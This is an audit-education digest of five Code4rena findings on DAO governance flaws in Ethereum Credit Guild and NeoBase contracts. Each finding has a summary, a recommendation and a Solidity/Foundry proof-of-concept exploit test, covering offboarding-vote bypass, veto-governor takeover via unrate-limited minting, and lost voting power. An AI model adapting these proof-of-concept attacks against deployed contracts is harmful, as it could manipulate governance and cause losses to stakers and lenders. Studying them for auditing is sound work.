# ETAAcademy-Adudit: 1. DAO

<table>
  <tr>
    <th>title</th>
    <th>tags</th>
  </tr>
  <tr>
    <td>01. DAO</td>
    <td>
      <table>
        <tr>
          <th>audit</th>
          <th>basic</th>
          <th>Governance</th>
          <td>DAO</td>
        </tr>
      </table>
    </td>
  </tr>
</table>

[Github](https://github.com/ETAAcademy)｜[Twitter](https://twitter.com/ETAAcademy)｜[ETA-Audit](https://github.com/ETAAcademy/ETAAcademy-Audit)

Authors: [Eta](https://twitter.com/pwhattie), looking forward to your joining

## 1. [Medium] Re-triggering the canOffboard[term] flag to bypass the DAO vote of the lending term offboarding mechanism

### Offboarding lending term

- Summary: The vulnerability allows an attacker to repeatedly trigger offboarding a re-onboarding lending term, bypassing the DAO vote offboarding mechanism. Even after the term is offboarded and cleaned up, the attacker can trigger another offboarding vote before the poll ends, to re-trigger the `canOffboard[term]` flag. This enables the attacker to force offboarding of the re-onboarded term at any time, overriding the DAO vote.

- Impact & Recommendation: The attack not only manipulates offboarding but also triggers silent auctions for existing loans. If a loan fails to attract bids, causing a loss, stakers who voted for the term via the SurplusGuildMinter contract are slashed, impacting both borrowers and stakers significantly. Prevent the offboarding poll from reactivating the `canOffboard[term]` flag after the lending term cleanup, or end the poll if the term has been cleaned up.
  <br> 🐬: [Source](https://code4rena.com/reports/2023-12-ethereumcreditguild#m-06-re-triggering-the-canoffboardterm-flag-to-bypass-the-dao-vote-of-the-lending-term-offboarding-mechanism) & [Report](https://code4rena.com/reports/2023-12-ethereumcreditguild)

  <details><summary>POC</summary>

  ```solidity

    function testPoCBreakingDaoVoteOffboarding() public {
        // Prepare for Attacker
        address Attacker = address(1);
        guild.mint(Attacker, 1);
        vm.prank(Attacker);
        guild.delegate(Attacker);
        // Prepare for Bob
        guild.mint(bob, _QUORUM);
        vm.startPrank(bob);
        guild.delegate(bob);
        uint256 POLL_DURATION_BLOCKS = offboarder.POLL_DURATION_BLOCKS();
        uint256 snapshotBlock = block.number;
        uint256 OFFBOARDING_POLL_END_BLOCK = snapshotBlock + POLL_DURATION_BLOCKS;
        // Bob proposes an offboarding of the term
        assertEq(guild.isGauge(address(term)), true);
        offboarder.proposeOffboard(address(term));
        // Next 1 day
        vm.roll(block.number + 6646); // 1 day
        vm.warp(block.timestamp + 6646 * 13);
        assertLe(block.number, OFFBOARDING_POLL_END_BLOCK);
        vm.expectRevert("LendingTermOffboarding: quorum not met");
        offboarder.cleanup(address(term));
        // Bob votes for offboarding the term and executes the offboarding (he has a sufficient voting weight)
        assertEq(guild.isGauge(address(term)), true);
        assertEq(offboarder.canOffboard(address(term)), false);
        offboarder.supportOffboard(snapshotBlock, address(term));
        offboarder.offboard(address(term));
        assertEq(guild.isGauge(address(term)), false);
        assertEq(offboarder.canOffboard(address(term)), true);
        // Cannot clean up because loans are active
        vm.expectRevert("LendingTermOffboarding: not all loans closed");
        offboarder.cleanup(address(term));
        // Next 1 day
        vm.roll(block.number + 6646); // 1 day
        vm.warp(block.timestamp + 6646 * 13);
        assertLe(block.number, OFFBOARDING_POLL_END_BLOCK);
        // Get enough CREDIT to pack back interests
        vm.stopPrank();
        uint256 debt = term.getLoanDebt(aliceLoanId);
        credit.mint(alice, debt - aliceLoanSize);
        // Alice closes loan
        vm.startPrank(alice);
        credit.approve(address(term), debt);
        term.repay(aliceLoanId);
        vm.stopPrank();
        // Clean up the term
        assertEq(psm.redemptionsPaused(), true);
        assertEq(offboarder.nOffboardingsInProgress(), 1);
        offboarder.cleanup(address(term));
        assertEq(psm.redemptionsPaused(), false);
        assertEq(offboarder.nOffboardingsInProgress(), 0);
        assertEq(offboarder.canOffboard(address(term)), false); // The canOffboard[term] flag has been reset
        assertEq(core.hasRole(CoreRoles.RATE_LIMITED_CREDIT_MINTER, address(term)), false);
        assertEq(core.hasRole(CoreRoles.GAUGE_PNL_NOTIFIER, address(term)), false);
        // Attacker votes for offboarding the term to re-trigger the canOffboard[term] flag again
        vm.startPrank(Attacker);
        assertEq(offboarder.canOffboard(address(term)), false);
        offboarder.supportOffboard(snapshotBlock, address(term));
        assertEq(offboarder.canOffboard(address(term)), true); // Attacker has re-triggered the canOffboard[term] flag
        vm.stopPrank();
        // Next 10 days
        // Offboarding poll expired
        vm.roll(block.number + 66460); // 10 days
        vm.warp(block.timestamp + 66460 * 13);
        assertGt(block.number, OFFBOARDING_POLL_END_BLOCK);
        // The term is re-onboarded
        assertEq(guild.isGauge(address(term)), false);
        guild.addGauge(1, address(term));
        assertEq(guild.isGauge(address(term)), true);
        // Next 30 days
        vm.roll(block.number + 199380); // 30 days
        vm.warp(block.timestamp + 199380 * 13);
        assertEq(guild.isGauge(address(term)), true);
        assertEq(psm.redemptionsPaused(), false);
        assertEq(offboarder.nOffboardingsInProgress(), 0);
        // Attacker offboards the term by overriding the DAO vote offboarding mechanism
        vm.startPrank(Attacker);
        offboarder.offboard(address(term));
        assertEq(guild.isGauge(address(term)), false);
        assertEq(psm.redemptionsPaused(), true);
        assertEq(offboarder.nOffboardingsInProgress(), 1);
    }

  ```

  </details>

## 2. [Medium] The gauge status wasn’t checked before reducing the user’s gauge weight.

### Reduce weight to transfer loss

- Summary: In the event of any loss triggered by **`ProfitManager#notifyPnL()`**, all staked guild tokens on the lending term will be entirely slashed through **`GuildToken#notifyGaugeLoss()`**, with termSurplusBuffer[gauge] depleting and donating to surplusBuffer. Loss will first decrease from surplusBuffer, and if surplusBuffer is insufficient, the remaining loss will reduce the creditMultiplier for each credit token. A term can be offboarded if deemed unsafe, pausing the redemption function of the corresponding SimplePSM. Once offboarded, potential losses are distributed to all credit token holders, as exiting in advance is not possible. However, guild holders can reduce their weight on the offboarded term, transferring potential losses to other holders.

- Impact & Recommendation: Preventing gauge weight deprecation upon offboarding a lending term is advisable, particularly with surplus GUILD minter, as it ensures protection for passive lenders by retaining surplus buffer capital that may otherwise escape.
  <br> 🐬: [Source](https://code4rena.com/reports/2023-12-ethereumcreditguild#m-17-the-gauge-status-wasnt-checked-before-reducing-the-users-gauge-weight) & [Report](https://code4rena.com/reports/2023-12-ethereumcreditguild)

  <details><summary>POC</summary>

  ```solidity
    function testOffboardTermAndDecrementGauge() public {
        //@audit-info term2 is deployed
        LendingTerm term2 = LendingTerm(Clones.clone(address(new LendingTerm())));
        term2.initialize(
            address(core),
            LendingTerm.LendingTermReferences({
                profitManager: address(profitManager),
                guildToken: address(guild),
                auctionHouse: address(auctionHouse),
                creditMinter: address(rlcm),
                creditToken: address(credit)
            }),
            LendingTerm.LendingTermParams({
                collateralToken: address(collateral),
                maxDebtPerCollateralToken: _CREDIT_PER_COLLATERAL_TOKEN,
                interestRate: _INTEREST_RATE,
                maxDelayBetweenPartialRepay: 0,
                minPartialRepayPercent: 0,
                openingFee: 0,
                hardCap: _HARDCAP
            })
        );
        vm.startPrank(governor);
        core.grantRole(CoreRoles.RATE_LIMITED_CREDIT_MINTER, address(term2));
        core.grantRole(CoreRoles.GAUGE_PNL_NOTIFIER, address(term2));
        vm.stopPrank();
        //@audit-info active term2, which has the same gauge type with term1
        guild.addGauge(1, address(term2));
        //@audit-info mint 2e18 guild token to carol
        guild.mint(carol, 2e18);
        vm.startPrank(carol);
        guild.incrementGauge(address(term), 1e18);
        guild.incrementGauge(address(term2), 1e18);
        vm.stopPrank();
        // prepare (1)
        guild.mint(bob, _QUORUM);
        vm.startPrank(bob);
        guild.delegate(bob);
        uint256 snapshotBlock = block.number;
        //@audit-info bob propose to offboard term
        offboarder.proposeOffboard(address(term));
        vm.roll(block.number + 1);
        vm.warp(block.timestamp + 13);
        //@audit-info term is able to be offboarded with enough votes.
        offboarder.supportOffboard(snapshotBlock, address(term));
        assertEq(offboarder.polls(snapshotBlock, address(term)), _QUORUM + 1);
        assertEq(offboarder.canOffboard(address(term)), true);
        assertEq(guild.isGauge(address(term)), true);
        assertEq(psm.redemptionsPaused(), false);
        assertEq(offboarder.nOffboardingsInProgress(), 0);
        offboarder.offboard(address(term));
        //@audit-info term is offboarded
        assertEq(guild.isGauge(address(term)), false);
        //@audit-info the redemption function is paused, no one can redeem their credit token
        assertEq(psm.redemptionsPaused(), true);
        assertEq(offboarder.nOffboardingsInProgress(), 1);
        vm.stopPrank();
        assertEq(guild.getUserGaugeWeight(carol, address(term)), 1e18);
        vm.prank(carol);
        //@audit-info however, carol can decrement their gauge weight on term
        guild.decrementGauge(address(term), 1e18);
        assertEq(guild.getUserGaugeWeight(carol, address(term)), 0);
    }

  ```

  </details>

## 3. [Medium] RateLimitedMinter isn’t used by SimplePSM resulting in Governance attacks

### Use rate limiter to mint or burn token

- Summary: ProfitManager and SimplePSM contracts don't use rate limiter so that the `RateLimitedMinter` buffer is never replenished. Attacker mints gUSDC tokens in the PSM contract without rate limiter, then using them to take malicious voting action in GuildVetoGovernor and cancel actions in the queue quickly without any consequences, because `ProfitManager.creditMultiplier` doesn’t decline.

- Impact & Recommendation: Use rate limiter across all contracts in the protocol when minting or burning Credit and Guild tokens.
  <br> 🐬: [Source](https://code4rena.com/reports/2023-12-ethereumcreditguild#m-21-ratelimitedminter-isnt-used-by-simplepsm-resulting-in-governance-attacks) & [Report](https://code4rena.com/reports/2023-12-ethereumcreditguild)

  <details><summary>POC</summary>

  ```solidity
    // SPDX-License-Identifier: GPL-3.0-or-later
    pragma solidity 0.8.13;
    import {Test} from "@forge-std/Test.sol";
    import {Core} from "@src/core/Core.sol";
    import {CoreRoles} from "@src/core/CoreRoles.sol";
    import {MockERC20} from "@test/mock/MockERC20.sol";
    import {SimplePSM} from "@src/loan/SimplePSM.sol";
    import {GuildToken} from "@src/tokens/GuildToken.sol";
    import {CreditToken} from "@src/tokens/CreditToken.sol";
    import {ProfitManager} from "@src/governance/ProfitManager.sol";
    import {ProfitManager} from "@src/governance/ProfitManager.sol";
    import {MockLendingTerm} from "@test/mock/MockLendingTerm.sol";
    import {IGovernor} from "@openzeppelin/contracts/governance/IGovernor.sol";
    import {GuildVetoGovernor} from "@src/governance/GuildVetoGovernor.sol";
    import {GuildTimelockController} from "@src/governance/GuildTimelockController.sol";
    import "@forge-std/console.sol";
    contract Poc4 is Test {
        Core private core;
        ProfitManager private profitManager;
        CreditToken credit;
        GuildToken guild;
        MockERC20 private pegToken;
        SimplePSM private psm;
        uint256 private constant _TIMELOCK_MIN_DELAY = 12345;
        GuildTimelockController private timelock;
        GuildVetoGovernor private vetoGovernor;
        uint256 __lastCallValue = 0;
        // From deployment script!

        uint256 private constant _VETO_QUORUM = 5_000_000e18;
        function setUp() public {
            vm.warp(1679067867);
            vm.roll(16848497);
            core = new Core();
            profitManager = new ProfitManager(address(core));
            credit = new CreditToken(address(core), "gUSDC", "gUSDC");
            guild = new GuildToken(address(core), address(profitManager));
            pegToken = new MockERC20(); // USDC
            pegToken.setDecimals(6);
            psm = new SimplePSM(
                address(core),
                address(profitManager),
                address(credit),
                address(pegToken)
            );
            timelock = new GuildTimelockController(
                address(core),
                _TIMELOCK_MIN_DELAY
            );
            // VetoGovernor for gUSDC
            vetoGovernor = new GuildVetoGovernor(
                address(core),
                address(timelock),
                address(credit),
                _VETO_QUORUM // 5Mil gUSDC
            );
            core.grantRole(CoreRoles.CREDIT_MINTER, address(this));
            core.grantRole(CoreRoles.CREDIT_MINTER, address(psm));
            core.grantRole(CoreRoles.CREDIT_GOVERNANCE_PARAMETERS, address(this));
            core.createRole(CoreRoles.TIMELOCK_EXECUTOR, CoreRoles.GOVERNOR);
            core.grantRole(CoreRoles.TIMELOCK_EXECUTOR, address(0));
            core.createRole(CoreRoles.TIMELOCK_CANCELLER, CoreRoles.GOVERNOR);
            core.grantRole(CoreRoles.TIMELOCK_CANCELLER, address(vetoGovernor));
            core.createRole(CoreRoles.TIMELOCK_PROPOSER, CoreRoles.GOVERNOR);
            core.grantRole(CoreRoles.TIMELOCK_PROPOSER, address(this));
            core.renounceRole(CoreRoles.GOVERNOR, address(this));
            credit.setMaxDelegates(1);
        }
        function __dummyCall(uint256 val) external {
            __lastCallValue = val;
        }
        function _queueDummyTimelockAction(
            uint256 number
        ) internal returns (bytes32) {
            address[] memory targets = new address[](1);
            targets[0] = address(this);
            uint256[] memory values = new uint256[](1);
            bytes[] memory payloads = new bytes[](1);
            payloads[0] = abi.encodeWithSelector(
                Poc4.__dummyCall.selector,
                number
            );
            bytes32 predecessor = bytes32(0);
            bytes32 salt = keccak256(bytes("dummy call"));
            timelock.scheduleBatch(
                targets,
                values,
                payloads,
                predecessor,
                salt,
                _TIMELOCK_MIN_DELAY
            );
            bytes32 timelockId = timelock.hashOperationBatch(
                targets,
                values,
                payloads,
                0,
                salt
            );
            return timelockId;
        }
        function test_poc() public {
            address Alice = address(100);
            // Schedule an action in the timelock, Alice will veto it.
            bytes32 timelockId = _queueDummyTimelockAction(12345);
            // Afluent Alice has 6Mil of USDC and mints gUSDC in PSM
            // PSM isn't rate-limited (there is no cap)!
            pegToken.mint(Alice, 6_000_000e6);
            vm.startPrank(Alice);
            pegToken.approve(address(psm), 6_000_000e6);
            psm.mint(Alice, 6_000_000e6);

            // Alice has enough voting power!
            require(credit.balanceOf(Alice) > vetoGovernor.quorum(0));
            credit.delegate(Alice);
            // Alice creates a Veto proposal
            uint256 proposalId = vetoGovernor.createVeto(timelockId);
            vm.roll(block.number + 1);
            vm.warp(block.timestamp + 10);
            // Alice cast a vote against
            vetoGovernor.castVote(proposalId, uint8(GuildVetoGovernor.VoteType.Against));
            vm.roll(block.number + 1);
            vm.warp(block.timestamp + 10);
            (
                uint256 againstVotes,
                uint256 forVotes,
                uint256 abstainVotes
            ) = vetoGovernor.proposalVotes(
                proposalId
            );
            // There is a Quorum, Alice can execute Veto proposal
            require(againstVotes > vetoGovernor.quorum(0));
            vetoGovernor.executeVeto(timelockId);
            vm.stopPrank();
        }
    }

  ```

  </details>

## 4. [High] If a gauge that a user has voted for gets removed, their voting power allocated for that gauge will be lost

### Vote requirement for gauge

- Summary: The GaugeController, based on Curve DAO's Vyper implementation, allows users to vote for incentive allocation using the vote_for_gauge_weights() function. However, governance can remove gauges, preventing further voting but leaving existing users' voting power intact. Specifically, a new require statement has been added to check if the gauge type is greater than 0, but this fix doesn't address the issue effectively because the gauge type for a nonexistent gauge is always 0.

- Impact & Recommendation: Remove the requirement checking for nonzero gauge types at the specified address to allow users to reclaim their votes from removed gauges.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-03-neobase#h-01-if-a-gauge-that-a-user-has-voted-for-gets-removed-their-voting-power-allocated-for-that-gauge-will-be-lost) & [Report](https://code4rena.com/reports/2024-03-neobase)

  <details><summary>POC</summary>

  ```solidity
      function testLostVotingPower() public {
        // prepare
        uint256 v = 10 ether;
        vm.deal(gov, v);
        vm.startPrank(gov);
        ve.createLock{value: v}(v);
        // add gauges
        gc.add_gauge(gauge1, 0);
        gc.add_type("", 0);
        gc.add_gauge(gauge2, 1);
        // all-in on gauge1
        gc.vote_for_gauge_weights(gauge1, 10000);
        // governance removes gauge1
        gc.remove_gauge_weight(gauge1);
        gc.remove_gauge(gauge1);
        // cannot vote for gauge2
        vm.expectRevert("Used too much power");
        gc.vote_for_gauge_weights(gauge2, 10000);
        // cannot remove vote for gauge1
        vm.expectRevert("Gauge not added"); // @audit remove after mitigation
        gc.vote_for_gauge_weights(gauge1, 0);
        // cannot vote for gauge2 (to demonstrate again that voting power is not removed)
        vm.expectRevert("Used too much power");  // @audit remove after mitigation
        gc.vote_for_gauge_weights(gauge2, 10000);
    }

    function testLostVotingPower() public {
        // prepare
        uint256 v = 10 ether;
        vm.deal(gov, v);
        vm.startPrank(gov);
        ve.createLock{value: v}(v);
        // add gauges
        gc.add_gauge(gauge1, 0);
        gc.change_gauge_weight(gauge1, 100);
        gc.add_type("", 100);
        gc.add_gauge(gauge2, 1);
        gc.change_gauge_weight(gauge2, 100);
        // all-in on gauge1
        gc.vote_for_gauge_weights(gauge1, 10000);
        // governance removes gauge1
        gc.remove_gauge_weight(gauge1);
        gc.remove_gauge(gauge1);
        // cannot vote for gauge2
        vm.expectRevert("Used too much power");
        gc.vote_for_gauge_weights(gauge2, 10000);
        // cannot remove vote for gauge1
        vm.expectRevert("Gauge not added"); // @audit remove after mitigation
        gc.vote_for_gauge_weights(gauge1, 0);
        // cannot vote for gauge2 (to demonstrate again that voting power is not removed)
        vm.expectRevert("Used too much power");  // @audit remove after mitigation
        gc.vote_for_gauge_weights(gauge2, 10000);
    }


  ```

  </details>

## 5. [Medium] Issue from previous audit still present: Gauge can have bigger weight than was intended by protocol

### Change gauge weight

- Summary: Users can exploit the "change_gauge_weight" function by monitoring the mempool for calls and front-running them to remove their voting power before the change occurs. This allows them to manipulate the gauge's weight, increasing it beyond the intended value set by governance.

- Impact & Recommendation: Remove `change_gauge_weight` function.
  <br> 🐬: [Source](hhttps://code4rena.com/reports/2024-03-neobase#m-03-issue-from-previous-audit-still-present-gauge-can-have-bigger-weight-than-was-intended-by-protocol) & [Report](https://code4rena.com/reports/2024-03-neobase)

  <details><summary>POC</summary>

  ```solidity
      /// @notice Allows governance to overwrite gauge weights
    /// @param _gauge Gauge address
    /// @param _weight New weight
    function change_gauge_weight(address _gauge, uint256 _weight) public onlyGovernance {
        _change_gauge_weight(_gauge, _weight);
    }

  ```

  </details>
